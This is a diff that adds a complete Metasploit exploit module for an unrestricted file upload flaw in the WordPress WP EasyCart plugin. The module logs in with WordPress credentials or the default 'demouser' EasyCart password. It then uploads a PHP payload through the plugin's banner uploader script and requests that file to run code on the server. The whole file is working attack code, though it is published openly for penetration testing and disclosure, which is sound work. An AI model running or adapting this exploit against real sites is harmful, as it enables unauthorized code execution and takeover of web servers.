@@ -1,0 +1,171 @@
+##
+# This module requires Metasploit: http://www.metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::FileDropper
+  include Msf::HTTP::Wordpress
+
+  def initialize(info = {})
+    super(update_info(
+      info,
+      'Name'            => 'WordPress WP EasyCart Unrestricted File Upload',
+      'Description'     => %q{WordPress Shopping Cart (WP EasyCart) Plugin for
+                              WordPress contains a flaw that allows a remote
+                              attacker to execute arbitrary PHP code. This
+                              flaw exists because the
+                              /inc/amfphp/administration/banneruploaderscript.php
+                              script does not properly verify or sanitize
+                              user-uploaded files. By uploading a .php file,
+                              the remote system will place the file in a
+                              user-accessible path. Making a direct request to
+                              the uploaded file will allow the attacker to
+                              execute the script with the privileges of the web
+                              server.
+
+                              In versions <= 3.0.8 authentication can be done by
+                              using the WordPress credentials of a user with any
+                              role. In later versions, a valid EasyCart admin
+                              password will be required that is in use by any
+                              admin user. A default installation of EasyCart will
+                              setup a user called "demouser" with a preset password
+                              of "demouser".},
+      'License'         => MSF_LICENSE,
+      'Author'          =>
+        [
+          'Kacper Szurek',                  # Vulnerability disclosure
+          'Rob Carr <rob[at]rastating.com>' # Metasploit module
+        ],
+      'References'      =>
+        [
+          ['OSVDB', '116806'],
+          ['WPVDB', '7745']
+        ],
+      'DisclosureDate'  => 'Jan 08 2015',
+      'Platform'        => 'php',
+      'Arch'            => ARCH_PHP,
+      'Targets'         => [['wp-easycart', {}]],
+      'DefaultTarget'   => 0
+    ))
+
+    register_options(
+      [
+        OptString.new('USERNAME', [false, 'The WordPress username to authenticate with (versions <= 3.0.8)']),
+        OptString.new('PASSWORD', [false, 'The WordPress password to authenticate with (versions <= 3.0.8)']),
+        OptString.new('EC_PASSWORD', [false, 'The EasyCart password to authenticate with (versions <= 3.0.18)', 'demouser']),
+        OptBool.new('EC_PASSWORD_IS_HASH', [false, 'Indicates whether or not EC_PASSWORD is an MD5 hash', false])
+      ], self.class)
+  end
+
+  def username
+    datastore['USERNAME']
+  end
+
+  def password
+    datastore['PASSWORD']
+  end
+
+  def ec_password
+    datastore['EC_PASSWORD']
+  end
+
+  def ec_password_is_hash
+    datastore['EC_PASSWORD_IS_HASH']
+  end
+
+  def use_wordpress_authentication
+    username.to_s != '' && password.to_s != ''
+  end
+
+  def use_ec_authentication
+    ec_password.to_s != ''
+  end
+
+  def req_id
+    if ec_password_is_hash
+      return ec_password
+    else
+      return Rex::Text.md5(ec_password)
+    end
+  end
+
+  def generate_mime_message(payload, date_hash, name, include_req_id)
+    data = Rex::MIME::Message.new
+    data.add_part(date_hash, nil, nil, 'form-data; name="datemd5"')
+    data.add_part(payload.encoded, 'application/x-php', nil, "form-data; name=\"Filedata\"; filename=\"#{name}\"")
+    data.add_part(req_id, nil, nil, 'form-data; name="reqID"') if include_req_id
+    data
+  end
+
+  def setup
+    if !use_wordpress_authentication && !use_ec_authentication
+      fail_with(Failure::BadConfig, 'You must set either the USERNAME and PASSWORD options or specify an EC_PASSWORD value')
+    end
+
+    super
+  end
+
+  def exploit
+    vprint_status("#{peer} - WordPress authentication attack is enabled") if use_wordpress_authentication
+    vprint_status("#{peer} - EC authentication attack is enabled") if use_ec_authentication
+
+    if use_wordpress_authentication && use_ec_authentication
+      print_status("#{peer} - Both EasyCart and WordPress credentials were supplied, attempting WordPress first...")
+    end
+
+    if use_wordpress_authentication
+      print_status("#{peer} - Authenticating using #{username}:#{password}...")
+      cookie = wordpress_login(username, password)
+
+      if !cookie
+        if use_ec_authentication
+          print_warning("#{peer} - Failed to authenticate with WordPress, attempting upload with EC password next...")
+        else
+          fail_with(Failure::NoAccess, 'Failed to authenticate with WordPress')
+        end
+      else
+        print_good("#{peer} - Authenticated with WordPress")
+      end
+    end
+
+    print_status("#{peer} - Preparing payload...")
+    payload_name = Rex::Text.rand_text_alpha(10)
+    date_hash = Rex::Text.md5(Time.now.to_s)
+    uploaded_filename = "#{payload_name}_#{date_hash}.php"
+    plugin_url = normalize_uri(wordpress_url_plugins, 'wp-easycart')
+    uploader_url = normalize_uri(plugin_url, 'inc', 'amfphp', 'administration', 'banneruploaderscript.php')
+    payload_url = normalize_uri(plugin_url, 'products', 'banners', uploaded_filename)
+    data = generate_mime_message(payload, date_hash, "#{payload_name}.php", use_ec_authentication)
+
+    print_status("#{peer} - Uploading payload to #{payload_url}")
+    res = send_request_cgi(
+      'method'  => 'POST',
+      'uri'     => uploader_url,
+      'ctype'   => "multipart/form-data; boundary=#{data.bound}",
+      'data'    => data.to_s,
+      'cookie'  => cookie
+    )
+
+    fail_with(Failure::Unreachable, 'No response from the target') if res.nil?
+    vprint_error("#{peer} - Server responded with status code #{res.code}") if res.code != 200
+
+    print_status("#{peer} - Executing the payload...")
+    register_files_for_cleanup(uploaded_filename)
+    res = send_request_cgi(
+    {
+      'uri'     => payload_url,
+      'method'  => 'GET'
+    }, 5)
+
+    if !res.nil? && res.code == 404
+      print_error("#{peer} - Failed to upload the payload")
+    else
+      print_good("#{peer} - Executed payload")
+    end
+  end
+end
